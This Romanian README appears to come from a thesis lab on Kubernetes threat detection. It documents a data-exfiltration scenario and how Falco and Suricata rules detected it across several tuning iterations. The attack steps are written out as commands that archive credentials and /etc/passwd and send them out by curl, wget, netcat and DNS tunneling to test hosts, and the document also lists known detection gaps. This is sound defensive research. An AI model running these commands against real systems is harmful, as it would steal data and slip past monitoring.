# Scenariul 7 — Data Exfiltration

**MITRE ATT&CK:** T1560 (Archive Collected Data), T1048 (Exfiltration Over Alternative Protocol) — sub-tehnici T1048.002 (encrypted non-C2), T1048.003 (unencrypted non-C2), T1071.004 (DNS)

## Pași de atac

1. **Stage & archive** — `tar czf /tmp/loot.tar.gz` peste fake creds (`creds.txt`) + fișiere sistem (`/etc/passwd`, `/etc/hostname`, `/etc/os-release`). [T1560]
2. **curl POST over HTTPS** — `curl -X POST --data-binary @/tmp/loot.tar.gz https://httpbin.org/post`. [T1048.002]
3. **wget POST over HTTP plaintext** — `wget --post-file=/tmp/loot.tar.gz http://httpbin.org/post`. [T1048.003]
4. **Raw TCP cu netcat** — `cat /tmp/loot.tar.gz | nc -w 3 example.com 80`. [T1048.003]
5. **DNS tunneling** — `base64(loot)` → chunks de 30 chars → `nslookup <chunk>.chunkN.exfil-thesis.example.com 8.8.8.8`. [T1071.004]

> **Prerequisite:** pod-ul a primit `curl`, `wget`, `dnsutils` via `apt-get install` (rulat separat înainte de `attack.sh`, deci în afara ferestrei marker). Acea instalare ar declanșa `K8S_THREAT: Package Manager in Running Container` (s08) dacă ar fi în fereastră.

## Rezultate finale (helm rev 22, după 3 iterații de tuning)

### Falco — 43 detecții

| Regulă | Tip | Priority | Count | Generată de |
|---|---|---|---|---|
| `K8S_THREAT: DNS Exfiltration Suspicion` | custom | Notice | 32 | nslookup ×4 (fiecare → `connect` + `sendmmsg`, × expandare search-domains) — pasul 5 |
| `Drop and execute new binary in container` | default | Critical | 7 | curl, wget, nc, nslookup ×4 |
| `K8S_THREAT: Data Exfiltration - Transfer Tool in Container` | custom | Warning | 3 | curl (step 2), wget (step 3), nc (step 4) |
| `K8S_THREAT: Network Scanning Tool in Container` | custom | Warning | 1 | nc (step 4) — overlap s05 |
| **Total Falco** | | | **43** | |

> Baseline (helm rev 19, înainte de tuning) era **11 detecții** — regula `DNS Exfiltration Suspicion` nu se declanșa deloc și metadata era `<NA>`. Vezi "Procesul de tuning" mai jos.

### Suricata — ~14 alerte (rev 22, când attack-pod era pe node-4 fără senzor)

> ⚠️ **Depășit (vezi rev 30 mai jos):** rezultatul de mai jos e din perioada în care attack-pod era pe
> **node-4 (fără senzor Suricata)** → traficul de exfil nici nu ajungea la un senzor. După mutarea pe
> **node-2**, Suricata **detectează** exfil-ul: `ET WEB_SERVER WebShell Generic - *.tar.gz in POST body`
> pe HTTP plaintext + `K8S-LOCAL Possible DNS Exfiltration` (sid 1000012) pe DNS tunneling. Tabelul de mai
> jos rămâne ca istoric al baseline-ului.

| Signature | Category | Count (rev 22) |
|---|---|---|
| `SURICATA STREAM Packet with invalid timestamp` | Generic Protocol Command Decode | ~6 |
| `SURICATA STREAM 3way handshake wrong seq wrong ack` | Generic Protocol Command Decode | ~5 |
| `SURICATA STREAM CLOSEWAIT FIN out of window` | Generic Protocol Command Decode | ~2 |
| `SURICATA HTTP Host part of URI is invalid` | Generic Protocol Command Decode | ~1 |

Toate sunt anomalii de transport la nivel de stream/HTTP, în plafonul de variație run-to-run, în mare parte pe traseul `*→10.1.84.145`/`10.1.217.70` (pod-uri falcosidekick, nelegate de atac). **Dar Suricata A capturat telemetrie pe atac**: zeci de evenimente `flow`, `dns` (inclusiv query-uri spre `8.8.8.8`/`8.8.4.4`), `http`, `fileinfo` (extragere fișier din HTTP). La rev 22 (attack-pod pe node-4, fără senzor): vizibilitate da, **detecție signature nu**. _Asta s-a schimbat la rev 30 (attack-pod pe node-2) — Suricata detectează acum exfil-ul pe canalele în clar; vezi secțiunea rev 30._

### Bilanț detecție

| Step | Detectat? | Prin ce |
|---|---|---|
| 1 — `tar` staging | ❌ NU | `tar` nu e în nicio listă de procese — **false negative structural acceptat** |
| 2 — curl HTTPS exfil | ✅ DA | Data Exfil Transfer Tool + Drop&Execute |
| 3 — wget HTTP exfil | ✅ DA | Data Exfil Transfer Tool + Drop&Execute |
| 4 — nc raw TCP exfil | ✅ DA | Data Exfil Transfer Tool + Network Scanning + Drop&Execute |
| 5 — DNS tunneling | ✅ DA | `K8S_THREAT: DNS Exfiltration Suspicion` (32 hits) + `Drop and execute new binary` (payload base64 vizibil în `proc.cmdline`) |

**Detection rate (pași cu alertă)**: 4/5 = 80% (`tar` staging rămâne FN structural acceptat).
**False positive rate**: 0%.

## Procesul de tuning

| Iterație | Modificare | Rezultat DNS rule | Note |
|---|---|---|---|
| A (baseline) | reguli existente; condiție `evt.type in (sendto, sendmsg)` | 0 hits | `DNS Exfiltration Suspicion` nu trage; `tar` staging FN; metadata k8s = `<NA>` în toate output-urile |
| B (helm rev 20) | extins condiția DNS rule cu `connect` și `sendmmsg` | încă 0 hits | regula compilată corect (`events: [connect, sendto, sendmsg, sendmmsg]` confirmat via `falco -L`), Falco rula noua versiune — dar tot nimic. Necesară, dar nu suficientă. |
| **C (helm rev 21)** | migrat `collectors.containerd`→`collectors.containerEngine` + adăugat socket-ul MicroK8s (`/var/snap/microk8s/common/run/containerd.sock`) la `engines.containerd.sockets` + `engines.cri.sockets` | **24 hits** ✅ | **plus**: enrichment-ul metadata k8s (`container.name`, `container.image.repository/tag`, `k8s.pod.name`, `k8s.ns.name`) acum funcționează — era o "limitare" documentată în teză. **Plus**: dispare warning-ul `WARNING(collectors)` la `helm upgrade`. |
| D (helm rev 22) | macro `not_system_namespace` upgradat la `container.id != host and (k8s.ns.name = "" or not k8s.ns.name in (k8s_system_namespaces))` (fail-open); re-rulare completă a scenariului | **32 hits** | filtrare reală pe namespace acum că `k8s.ns.name` se populează; `custom_container` rămâne `container.id != host`. Total scenariu: **43 detecții**. |

### Iterațiile B+C — analiza root cause-ului (material valoros pentru Cap D / Cap 6)

Eșecul inițial al regulii `DNS Exfiltration Suspicion` a avut **două cauze suprapuse**:

1. **Condiția prea îngustă** (rezolvată în iterația B): `evt.type in (sendto, sendmsg)` — dar `nslookup`/resolver-ul glibc, când i se dă un server explicit, face `connect()` pe socket-ul UDP + `sendto`/`sendmmsg`. Fix: `(evt.type = connect or evt.type in (sendto, sendmsg, sendmmsg))`.

2. **`container.id` nu se popula pe evenimentele de rețea** (rezolvată în iterația C): plugin-ul `container@0.6.3` nu se putea conecta la containerd-ul MicroK8s, pentru că chart-ul Helm 8.0.2 montează doar socket-urile default (`/run/containerd/containerd.sock`, `/run/k3s/...` etc.) — **nu** și `/var/snap/microk8s/common/run/containerd.sock`. Fără conexiune la runtime, plugin-ul deriva `container.id` doar din cgroups (suficient pentru `execve`), dar pentru evenimentele de rețea (`connect`/`sendto`/`sendmmsg`) enrichment-ul era inconsistent → macro-ul `custom_container` (`container.id != host`) nu făcea match → regula nu se declanșa. După ce am adăugat socket-ul MicroK8s la `collectors.containerEngine.engines.containerd.sockets` și `.engines.cri.sockets`, logurile Falco confirmă `* enabled container runtime socket at '/host/var/snap/microk8s/common/run/containerd.sock'` — și regula trage robust (24 detecții din 3 invocări `nslookup`, pentru că fiecare invocare face expandare cu search-domains × `connect`+`sendto`).

**Lecție Cap D**: un singur simptom ("regula nu trage") poate avea **mai multe cauze independente**, iar debugging-ul iterativ — modifică o variabilă, re-testează, observă — le izolează una câte una. Concluzia intermediară din iterația B ("`fd.*` nefuncțional pe UDP — limitare de infrastructură") era **greșită** — era enrichment-ul container-plugin, nu eBPF-ul. **Important pentru teză**: documentăm și ipoteza greșită, pentru că procesul de eliminare a ipotezelor este parte din contribuția practică (Cap D).

**Beneficiu secundar major (iterația C)**: enrichment-ul metadata k8s acum funcționează pe TOT clusterul. Output-urile Falco au `container_name=attacker image=docker.io/library/ubuntu k8s_ns=attack-target k8s_pod=attack-pod` în loc de `<NA>`. Aceasta era listată drept "Limitare" în Cap 6 (vezi `attack-scenarios/04-sensitive-file`) — acum e **rezolvată**. **Follow-up neefectuat încă**: macro-urile `custom_container`/`not_system_namespace` (acum `container.id != host`) ar putea fi upgradate să folosească `k8s.ns.name not in (k8s_system_namespaces)` pentru filtrare corectă pe namespace. Scenariile rulate înainte de iterația C (03/04/05/06) au output-uri cu `<NA>` în documentația lor — ar fi de re-rulat pentru consistență.

> Context extern relevant: [falcosecurity/falco#3501](https://github.com/falcosecurity/falco/issues/3501) raportează `fd.sip`/`fd.sip.name` nefuncționale cu modern eBPF — **problemă diferită** de a noastră (a fost enrichment-ul container, nu câmpurile de rețea), dar confirmă că enrichment-ul pe modern eBPF e o zonă cu edge case-uri.

## Re-validare pe helm rev 30 (2026-06-18) — schimbări majore de rol detecție

Re-rulat (attack-pod pe node-2, helm rev 30). Rezultatul **inversează rolurile** față de baseline-ul rev 22:

### A. Falco DNS-exfil NU mai trage (32 → 0) — fragilitate enrichment UDP

- **Falco: 11 detecții** (era 43): `Drop and execute new binary` ×7, `Data Exfiltration -
  Transfer Tool` ×3 (curl/wget/nc), `Network Scanning Tool` ×1 (nc). **`DNS Exfiltration Suspicion`
  = 0 hits** (era 32).
- Cauză confirmată prin tail pe Falco node-2: la fiecare `nslookup`, evenimentul `execve` se
  emite cu **enrichment complet** (`Drop and execute new binary`, `container.id`/`k8s.pod.name`
  populate) — dar evenimentul de **rețea UDP** (`connect`/`sendto` spre 8.8.8.8:53) **nu produce
  niciun match**: `fd.rport`/`fd.rip`/`fd.rnet` nu se populează pe syscall-ul UDP, deci condiția
  regulii (`fd.rport=53 and not fd.rnet in (...)`) eșuează silent. Acesta este **același edge-case
  de enrichment pe rețea UDP cu modern eBPF** (falco#3501) — funcționa în rev 21/22 (attack-pod pe
  node-4), nu mai funcționează acum (node-2). Calea `execve` rămâne robustă; doar `fd.*` pe UDP e fragil.
- **Confirmat pe 2 rulări consecutive (2026-06-18): ambele 0 hits.** Nu e o variație random run-to-run,
  ci o **eșuare STABILĂ** pe configurația curentă (attack-pod pe node-2 / falco pod node-2). Caracterizare
  precisă pentru teză: enrichment-ul `fd.*` pe evenimentele de rețea (UDP connect/sendto + unele TCP
  connect — vezi s02 `Crypto Mining Pool Connection` = 0) e **dependent de nod/stare-driver**, nu
  intermitent în timp pe același nod. Pe stack-ul curent (modern eBPF + container plugin pe node-2)
  regulile bazate exclusiv pe `fd.rport`/`fd.rip` la nivel de syscall de rețea **nu pot fi considerate
  fiabile** — concluzie de design relevantă pentru Cap D/Cap 6.
- Context suplimentar: egress extern spre `8.8.8.8:53` e **blocat de firewall-ul facultății**
  (`communications error ... timed out`) — nslookup tot face `connect()` la syscall, deci nu firewall-ul
  e cauza lipsei de detecție, ci enrichment-ul fd UDP.
- **DNS exfil ESTE detectat de Suricata** (regula custom `sid 1000012` — „K8S-LOCAL Possible DNS
  Exfiltration - abnormally long query label", validat ×5 pe query-urile DNS ale pasului 5). Deci la
  nivel de sistem DNS tunneling-ul e prins, pe stratul **NIDS** (content-based, pe label-ul DNS),
  independent de regula Falco port-53. **Lecție Cap D/Cap 6:** detecția DNS-tunneling bazată pe `fd.*`
  la syscall UDP e fragilă pe acest stack (regula Falco = 0), dar stratul NIDS o acoperă — exact
  valoarea defense-in-depth: un layer compensează slăbiciunea celuilalt.

### B. Suricata DETECTEAZĂ acum exfil-ul HTTP — semnătură ET reală

- **Suricata: `ET WEB_SERVER WebShell Generic - *.tar.gz in POST body` ×5** (categorie
  "Potentially Bad Traffic", severity 2) — pe POST-ul `curl`/`wget` cu `loot.tar.gz` în body spre
  httpbin.org. **Este o detecție de threat autentică, nu zgomot.** Plus anomaliile uzuale STREAM/HTTP.
- Asta **răstoarnă parțial concluzia veche #2 ("vizibilitate fără detecție")**: pentru calea de exfil
  **HTTP cu arhivă în POST body**, ET Open chiar are signature și o prinde (efectul combinat al mutării
  attack-pod pe node-2 cu senzor + fix-ul HOME_NET din s09). Concluzia rămâne validă DOAR pentru exfil
  peste **TLS** (curl HTTPS — payload criptat, invizibil la signature) și DNS spre rezolver public.
- _Caveat run-to-run: semnătura `.tar.gz POST` se declanșează DOAR pe leg-ul HTTP **plaintext**
  (pasul 3 wget → httpbin). La a 2-a rulare (2026-06-18) POST-ul HTTPS (pasul 2) a mers spre IP-ul
  Cloudflare al httpbin pe TLS → payload criptat → semnătura NU a apărut (doar anomalii). Deci și
  detecția Suricata pe exfil depinde de calea în clar — întărește limita: criptarea (TLS) ascunde
  exfil-ul de NIDS, indiferent de senzor._

**Bilanț nou (Cap D):** la baseline (attack-pod pe node-4) Suricata era oarbă; acum (pe node-2) **Suricata
detectează exfil-ul pe ambele canale în clar** — HTTP (`ET WEB_SERVER ... *.tar.gz in POST body`) ȘI DNS
tunneling (`sid 1000012`). Regula Falco port-53 pentru DNS a încetat să tragă (enrichment UDP), dar DNS
exfil-ul e prins de stratul NIDS — deci la nivel de sistem rămâne acoperit. Demonstrează concret valoarea
**defense-in-depth**: unde un layer slăbește (Falco pe DNS), celălalt acoperă (Suricata pe DNS). Singurul
canal rămas nedetectabil de NIDS e exfil-ul peste **TLS** (criptat), prins doar de Falco (tool-ul în container).

## Discoveries (relevant pentru Cap D și Cap 6)

### 1. Debugging iterativ cu mai multe cauze suprapuse — `DNS Exfiltration Suspicion`

(Vezi secțiunea "Iterațiile B+C" de mai sus.) Pe scurt: regula a avut nevoie de DOUĂ fix-uri — (a) extinderea condiției de syscall-uri (B), (b) repararea conexiunii plugin-ului `container` la socket-ul MicroK8s, care a făcut `container.id` să se populeze pe evenimentele de rețea (C). A doua era și cauza "metadata k8s null" din restul tezei → rezolvată ca beneficiu colateral. Cealaltă regulă de rețea încă defectă: `Reverse Shell - Shell with Network FD` (verifică `fd.type` la `execve` — eveniment greșit; default-ul `Redirect STDOUT/STDIN to Network Connection` acoperă cazul).

### 2. Suricata: DETECTEAZĂ exfil-ul pe canalele în clar (corectat la rev 30)

Cu attack-pod pe node-2 (nod cu senzor), Suricata **detectează** exfil-ul prin signature, nu doar îl *vede*:
- **HTTP plaintext cu arhivă** → `ET WEB_SERVER WebShell Generic - *.tar.gz in POST body` (ET Open).
- **DNS tunneling** → regula custom `K8S-LOCAL Possible DNS Exfiltration - abnormally long query label`
  (sid 1000012, content-based pe lungimea label-ului DNS).

Rămâne nedetectabil de NIDS-ul signature-based DOAR exfil-ul peste **TLS** (curl HTTPS — payload criptat,
invizibil pe fir) și peste canale „legitim-looking" la nivel de reputație. Pentru acelea ai nevoie de
anomaly detection / DLP / TLS interception — out of scope pentru un PoC.

**Insight Cap 6**: NIDS-ul prinde exfil-ul pe **canale în clar** (HTTP, DNS), dar criptarea îl ascunde.
Combinația rămâne valoroasă: Falco prinde *tool-ul* (curl/wget/nc în container = anomalie de comportament
host) chiar și când traficul e criptat, iar Suricata prinde *conținutul* (signature) pe canalele
neîncriptate. Defense in depth = layere cu puncte forte complementare care se acoperă reciproc.

### 3. Detecție pe `tipul tool-ului`, nu pe `conținut`

`K8S_THREAT: Data Exfiltration - Transfer Tool` se declanșează când curl/wget/nc rulează, indiferent ce trimit — nu inspectează payload. Limitare: un binar custom (client HTTP scris în Go, redenumit ca proces inofensiv) ar evita regula pattern-based. Doar `Drop and execute new binary` (comportamentală, bazată pe ctime vs container start) l-ar prinde — și doar dacă binarul e dropat post-startup.

### 4. Cross-scenario overlap confirmat din nou

`nc` declanșează 3 reguli (Data Exfil s07 + Network Scanning s05 + Drop&Execute default). `curl`/`wget`/`nc`/`nslookup` toate declanșează `Drop and execute new binary` pentru că au fost instalate post-startup (ca în scenariul 6 cu `sudo`). Pattern "TTP-urile se suprapun natural" — observabil pentru Cap E.

### 5. Staging-ul (`tar`) — false negative structural

Arhivarea de date colectate (T1560) trece complet neobservată — `tar`/`gzip`/`zip` nu sunt procese suspecte. O regulă care le-ar flagui ar fi extrem de zgomotoasă (tar e omniprezent în CI/CD, backup, package install). Documentat ca limitare acceptată: detecția se concentrează pe *transferul* (exfil), nu pe *colectarea* (staging).

## Cross-tool correlation
**Real (de la rev 30).** Pe canalele în clar, ambele straturi alertează pe același atac: Falco prinde
*tool-ul* (curl/wget/nc în container), Suricata prinde *conținutul pe fir* — `ET WEB_SERVER ... *.tar.gz
in POST body` (HTTP) și `K8S-LOCAL Possible DNS Exfiltration` (sid 1000012, DNS tunneling). Plus Suricata
furnizează context de investigație (ce domeniu, ce volum, ce fișiere). Excepție: exfil-ul peste **TLS**
rămâne doar la Falco (NIDS-ul vede doar handshake-ul). Cross-tool de detecție autentic, alături de
scenariile 5 (Network Scanning) și 2 (Crypto Mining → pool connection).

## False negatives confirmate

- **Staging cu `tar`/`gzip`/`zip`** — nedetectat (vezi #5).
- **DNS exfil prin rezolverul intern (bypass doar pentru regula Falco)** — dacă query-ul merge la CoreDNS (`10.152.183.10`) în loc de un rezolver extern, regula Falco `DNS Exfiltration Suspicion` NU se declanșează (IP intern, exclus din condiție). **Dar Suricata `sid 1000012` rămâne validă** — e content-based pe `dns.query` (orice destinație), deci prinde label-ul lung indiferent de rezolver, atâta timp cât query-ul traversează un senzor. Deci bypass-ul e doar pentru stratul Falco, nu pentru sistem.
- **Exfil peste C2 legitim-looking** — POST către domeniu cu reputație bună, Slack/Telegram webhooks; Falco vede tool-ul (curl) dar nu distinge de uz legitim; Suricata vede TLS SNI dar domeniul nu e pe blacklist.
- **Exfil low-and-slow / rate-limitat** — chunk-uri mici, timp lung; nicio regulă de threshold în PoC.
- **Binar custom pentru transfer** — vezi #3.

## Comanda de rulare

```bash
# prerequisite o singură dată:
kubectl exec -n attack-target attack-pod -- bash -c 'apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq curl wget dnsutils'

./attack.sh
```

## Update 2026-06-16 — attack-pod mutat pe node-2 (vizibilitate Suricata)

attack-pod a fost mutat de pe node-4 (ELK, **fără senzor**) pe **node-2** (`attack-target-setup.yaml`, `nodeName: node-2`). Pe node-4, exfil-ul outbound spre extern (httpbin/8.8.8.8) ieșea pe NIC-ul node-4 → **Suricata-blind**. Pe node-2, traficul outbound al attack-pod e acum prins de senzorul node-2 — și **nu doar ca telemetrie: Suricata alertează prin signature** pe canalele în clar (`ET WEB_SERVER ... *.tar.gz in POST body` pe HTTP plaintext + `K8S-LOCAL Possible DNS Exfiltration` sid 1000012 pe DNS tunneling). Mutarea pe un nod cu senzor a transformat s07 într-un scenariu de detecție cross-tool real. Rămâne nedetectabil de NIDS doar exfil-ul peste TLS (payload criptat).
